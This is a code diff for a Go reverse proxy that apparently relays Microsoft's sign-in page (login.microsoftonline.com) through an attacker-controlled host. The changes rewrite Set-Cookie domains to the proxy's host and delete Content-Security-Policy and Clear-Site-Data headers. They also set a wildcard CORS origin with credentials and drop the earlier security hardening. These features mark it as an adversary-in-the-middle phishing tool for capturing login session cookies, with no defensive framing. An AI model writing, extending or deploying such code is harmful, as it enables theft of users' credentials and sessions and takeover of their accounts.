@@ -44,12 +44,6 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    // Handle preflight OPTIONS request for CORS
-    if r.Method == http.MethodOptions {
-        handlePreflight(w, r)
-        return
-    }
-
     upstreamURL := upstream + upstreamPath + r.URL.Path
     req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
     if err != nil {
@@ -74,44 +68,36 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     body, _ := ioutil.ReadAll(resp.Body)
     bodyString := string(body)
 
-    // Ensure _bssoConfig cookie remains unaltered in response
-    copyHeadersWithCookies(resp.Header, w.Header())
+    // Handle response headers
+    newResponseHeaders := w.Header()
 
-    // Add CORS headers to the response
-    addCORSHeaders(w, r)
+    // Set CORS headers
+    newResponseHeaders.Set("Access-Control-Allow-Origin", "*")
+    newResponseHeaders.Set("Access-Control-Allow-Credentials", "true")
 
-    // Add or update the Content-Security-Policy header to allow specific scripts
-    addCSPHeaders(w)
+    // Remove restrictive headers
+    newResponseHeaders.Del("Content-Security-Policy")
+    newResponseHeaders.Del("Content-Security-Policy-Report-Only")
+    newResponseHeaders.Del("Clear-Site-Data")
+
+    // Replace cookie domains
+    modifySetCookies(resp.Header, newResponseHeaders, r.Host)
+
+    // Copy other headers from the response
+    copyHeaders(resp.Header, newResponseHeaders)
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
 }
 
-// Handle preflight OPTIONS request
-func handlePreflight(w http.ResponseWriter, r *http.Request) {
-    addCORSHeaders(w, r)
-    w.WriteHeader(http.StatusOK)
-}
-
-// Add CORS headers to the response
-func addCORSHeaders(w http.ResponseWriter, r *http.Request) {
-    origin := r.Header.Get("Origin")
-    if origin != "" {
-        w.Header().Set("Access-Control-Allow-Origin", origin)
-    } else {
-        w.Header().Set("Access-Control-Allow-Origin", "*")
+func copyHeaders(src http.Header, dst http.Header) {
+    for k, v := range src {
+        for _, vv := range v {
+            dst.Add(k, vv)
+        }
     }
-    w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
-    w.Header().Set("Access-Control-Allow-Headers", r.Header.Get("Access-Control-Request-Headers"))
-    w.Header().Set("Access-Control-Allow-Credentials", "true")
 }
 
-// Add or modify CSP headers
-func addCSPHeaders(w http.ResponseWriter) {
-    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; base-uri 'self';")
-}
-
-// copyHeadersWithCookies ensures that the _bssoConfig cookie is copied without alteration
 func copyHeadersWithCookies(src http.Header, dst http.Header) {
     for k, v := range src {
         for _, vv := range v {
@@ -123,6 +109,14 @@ func copyHeadersWithCookies(src http.Header, dst http.Header) {
                 dst.Add(k, vv)
             }
         }
+    }
+}
+
+func modifySetCookies(src http.Header, dst http.Header, host string) {
+    originalCookies := src.Values("Set-Cookie")
+    for _, originalCookie := range originalCookies {
+        modifiedCookie := strings.Replace(originalCookie, "login.microsoftonline.com", host, -1)
+        dst.Add("Set-Cookie", modifiedCookie)
     }
 }
 
